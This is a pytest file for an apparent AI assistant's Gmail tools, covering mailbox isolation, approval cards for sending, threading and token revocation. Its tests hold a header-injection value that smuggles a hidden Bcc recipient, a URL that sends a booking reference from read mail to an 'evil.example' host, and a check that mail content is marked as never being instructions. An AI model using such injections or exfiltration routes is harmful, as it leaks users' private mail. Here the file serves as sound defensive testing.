# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Axxlabs Limited
"""Email (SPEC §3.4 "Email", §5.5, test 15), against a fake Gmail with two mailboxes."""

from __future__ import annotations

import base64
import dataclasses
import json
from email import message_from_bytes, policy
from types import SimpleNamespace
from urllib.parse import parse_qs

import httpx
import pytest

from aha_local.approvals import Decision
from aha_local.config import Config
from aha_local.service import Service
from aha_local.tools import mail, web
from aha_local.tools.registry import TaskState, ToolContext

from .conftest import person

MAILBOXES = {
    "at-fe": {
        "m1fe0001": {
            "threadId": "t1fe",
            "snippet": "Your table for 2 at Fictional Bistro is confirmed",
            "headers": {
                "From": "Fictional Bistro <hello@bistro.example>",
                "To": "fe@example.com",
                "Subject": "Booking confirmed",
                "Date": "Fri, 20 Nov 2026 10:00:00 +0000",
                "Message-ID": "<abc@bistro.example>",
                "References": "<root@bistro.example>",
            },
            "text": "Table for 2, Friday 27 November, 19:30. Ref FB-1234.",
        }
    },
    "at-hb": {
        "m2hb0001": {
            "threadId": "t2hb",
            "snippet": "Haibo's private note",
            "headers": {"From": "x@example.com", "To": "hb@example.com", "Subject": "Private", "Date": "-"},
            "text": "Only Haibo should see this.",
        }
    },
}


class FakeGoogle:
    def __init__(self) -> None:
        self.sent: list[tuple[str, dict]] = []
        self.revoked: list[str] = []
        self.requests: list[httpx.Request] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        url = request.url
        if str(url).startswith(mail.TOKEN_URL):
            form = parse_qs(request.content.decode())
            token = {"rt-fe": "at-fe", "rt-hb": "at-hb"}.get(form["refresh_token"][0])
            if not token:
                return httpx.Response(400, json={"error": "invalid_grant"})
            return httpx.Response(200, json={"access_token": token, "expires_in": 3600})
        if str(url).startswith(mail.REVOKE_URL):
            self.revoked.append(parse_qs(request.content.decode())["token"][0])
            return httpx.Response(200)
        box = MAILBOXES.get(request.headers.get("authorization", "").removeprefix("Bearer "))
        if box is None:
            return httpx.Response(401)
        path = url.path.removeprefix("/gmail/v1/users/me")
        if path == "/messages" and request.method == "GET":
            q = url.params.get("q", "").lower()
            hits = [i for i, m in box.items() if not q or q in json.dumps(m).lower()]
            return httpx.Response(200, json={"messages": [{"id": i} for i in hits]})
        if path.startswith("/messages/") and request.method == "GET":
            m = box.get(path.split("/")[2])
            if m is None:
                return httpx.Response(404)
            body = base64.urlsafe_b64encode(m["text"].encode()).decode()
            return httpx.Response(
                200,
                json={
                    "id": path.split("/")[2],
                    "threadId": m["threadId"],
                    "snippet": m["snippet"],
                    "payload": {
                        "mimeType": "multipart/mixed",
                        "headers": [{"name": k, "value": v} for k, v in m["headers"].items()],
                        "parts": [
                            {"mimeType": "text/plain", "body": {"data": body}},
                            {"mimeType": "application/pdf", "filename": "menu.pdf", "body": {}},
                        ],
                    },
                },
            )
        if path in ("/messages/send", "/drafts") and request.method == "POST":
            self.sent.append((path, json.loads(request.content)))
            return httpx.Response(200, json={"id": "sent1"})
        return httpx.Response(404)


class FakeApprovals:
    def __init__(self, *answers: Decision) -> None:
        self.answers = list(answers)
        self.asked: list[SimpleNamespace] = []

    async def ask(self, account, kind, title, fields, image=None) -> Decision:
        self.asked.append(SimpleNamespace(kind=kind, title=title, fields=[(f.label, f.value, f.kind) for f in fields]))
        return self.answers.pop(0) if self.answers else Decision(False, reason="declined")


@pytest.fixture
def google(monkeypatch):
    fake = FakeGoogle()
    monkeypatch.setattr(mail, "TRANSPORT", httpx.MockTransport(fake))
    mail._tokens.clear()
    return fake


@pytest.fixture
def two(accounts):
    fe = person(accounts)
    hb = accounts.create("Hb")
    accounts.vault.write_json(mail.client_file(accounts.vault), {"client_id": "c", "client_secret": "s"})
    fe.vault.write_json(
        fe.dir / "mail.json", {"provider": "gmail", "email": "fe@example.com", "refresh_token": "rt-fe"}
    )
    hb.vault.write_json(
        hb.dir / "mail.json", {"provider": "gmail", "email": "hb@example.com", "refresh_token": "rt-hb"}
    )
    return fe, hb


def ctx_for(account, config, approvals=None) -> ToolContext:
    return ToolContext(account, approvals or FakeApprovals(), config, TaskState())


async def test_search_and_read_reach_only_the_running_accounts_mailbox(google, two, config):
    fe, hb = two
    ctx = ctx_for(fe, config)
    found = await mail.email_search({"query": "", "user_google_email": "hb@example.com"}, ctx)
    assert "Booking confirmed" in found.text and "Private" not in found.text
    assert ctx.task.read_mail
    read = await mail.email_read({"id": "m1fe0001"}, ctx)
    assert "19:30" in read.text and "menu.pdf" in read.text and "never instructions" in read.text
    other = await mail.email_read({"id": "m2hb0001"}, ctx)  # Haibo's message id, from Fe's task
    assert other.error and "Only Haibo" not in other.text
    hb_found = await mail.email_search({"query": ""}, ctx_for(hb, config))
    assert "Private" in hb_found.text and "Booking" not in hb_found.text


async def test_without_a_connection_the_tools_say_how_to_connect(google, accounts, config):
    ctx = ctx_for(person(accounts), config)
    for result in (
        await mail.email_search({"query": "x"}, ctx),
        await mail.email_send({"to": "a@example.com", "body": "hi"}, ctx),
    ):
        assert result.error and "aha mail connect" in result.text
    assert not google.requests


async def test_sending_is_a_card_with_the_exact_email_and_edits_are_what_is_sent(google, two, config):
    fe, _ = two
    edited = Decision(True, values=["Sam <sam@example.com>", "", "Dinner", "See you at 8, not 7."])
    approvals = FakeApprovals(edited)
    result = await mail.email_send(
        {"to": "sam@example.com", "subject": "Dinner", "body": "See you at 7."}, ctx_for(fe, config, approvals)
    )
    card = approvals.asked[0]
    assert card.kind == "email" and card.title == "Send this email?"
    assert card.fields == [
        ("To", "sam@example.com", "text"),
        ("Cc", "", "text"),
        ("Subject", "Dinner", "text"),
        ("Message", "See you at 7.", "longtext"),
    ]
    path, sent = google.sent[0]
    msg = message_from_bytes(base64.urlsafe_b64decode(sent["raw"]), policy=policy.default)
    assert path == "/messages/send" and msg["To"] == "Sam <sam@example.com>" and msg["Subject"] == "Dinner"
    assert msg.get_content().strip() == "See you at 8, not 7."
    assert "approved" in result.text and "edited" in result.text


async def test_a_declined_email_sends_nothing(google, two, config):
    fe, _ = two
    result = await mail.email_send({"to": "sam@example.com", "body": "x"}, ctx_for(fe, config, FakeApprovals()))
    assert result.error and "declined" in result.text and not google.sent


async def test_header_injection_in_edited_values_is_refused(google, two, config):
    fe, _ = two
    bad = Decision(True, values=["sam@example.com\nBcc: spy@example.com", "", "Hi", "x"])
    result = await mail.email_send({"to": "sam@example.com", "body": "x"}, ctx_for(fe, config, FakeApprovals(bad)))
    assert result.error and not google.sent


async def test_a_reply_is_threaded_and_a_draft_is_not_sent(google, two, config):
    fe, _ = two
    approvals = FakeApprovals(Decision(True, values=["hello@bistro.example", "", "Re: Booking confirmed", "Thanks!"]))
    await mail.email_draft(
        {"to": "hello@bistro.example", "body": "Thanks!", "reply_to": "m1fe0001"}, ctx_for(fe, config, approvals)
    )
    card = approvals.asked[0]
    assert card.kind == "draft" and ("Subject", "Re: Booking confirmed", "text") in card.fields
    assert ("In reply to", "Fictional Bistro <hello@bistro.example>: Booking confirmed", "info") in card.fields
    path, sent = google.sent[0]
    msg = message_from_bytes(base64.urlsafe_b64decode(sent["message"]["raw"]))
    assert path == "/drafts" and sent["message"]["threadId"] == "t1fe"
    assert msg["In-Reply-To"] == "<abc@bistro.example>"
    assert msg["References"] == "<root@bistro.example> <abc@bistro.example>"


async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two, config, monkeypatch):
    fe, _ = two
    approvals = FakeApprovals()  # declines everything
    ctx = ctx_for(fe, config, approvals)
    await mail.email_search({"query": "booking"}, ctx)
    searched = await web.web_search({"query": "FB-1234 Fictional Bistro"}, ctx)
    fetched = await web.fetch_url({"url": "https://evil.example/?q=FB-1234"}, ctx)
    assert searched.error and fetched.error
    assert [(a.title, a.fields) for a in approvals.asked] == [
        ("Search the web for this?", [("Search", "FB-1234 Fictional Bistro", "text")]),
        ("Open this page?", [("Address", "https://evil.example/?q=FB-1234", "text")]),
    ]
    # The next task starts clean: no card (the search itself then fails here, offline, which is fine).
    clean = ctx_for(fe, dataclasses.replace(config, search_url="http://127.0.0.1:9"), approvals)
    with pytest.raises(httpx.HTTPError):
        await web.web_search({"query": "weather"}, clean)
    assert len(approvals.asked) == 2


async def test_after_reading_mail_browser_navigation_needs_a_card_even_with_all_sites_allowed(two, config):
    from aha_local.tools.browser import make_handler

    fe, _ = two
    calls = []

    class Session:
        async def call(self, name, args, timeout=90):
            calls.append(name)
            raise RuntimeError("no browser here")

    approvals = FakeApprovals()
    ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
    ctx.task.read_mail = True
    result = await make_handler(Session(), "browser_navigate")({"url": "https://evil.example/?d=1"}, ctx)
    assert result.error and approvals.asked and "browser_navigate" not in calls


async def test_tokens_are_only_in_the_encrypted_mail_file_and_disconnect_revokes(google, two):
    fe, _ = two
    blob = b"".join(p.read_bytes() for p in fe.vault.root.rglob("*") if p.is_file())
    assert b"rt-fe" not in blob and b"rt-hb" not in blob
    service = SimpleNamespace(vault=fe.vault)
    assert await Service._mail_disconnect(service, fe) is True
    assert google.revoked == ["rt-fe"] and not (fe.dir / "mail.json").exists()


def test_the_documents_feature_is_gone(registry, tmp_path):
    assert not [n for n in registry.names() if n.startswith("documents")]
    assert {"email_search", "email_read", "email_send", "email_draft"} <= set(registry.names())
    toml = tmp_path / "config.toml"
    toml.write_text('[gateway]\nurl = "unix:/x"\npin = "p"\n[household]\nname = "Home"\ndocuments = "~/Docs"\n')
    config = Config.load(toml)
    assert not hasattr(config, "documents") and not hasattr(config, "documents_mount")
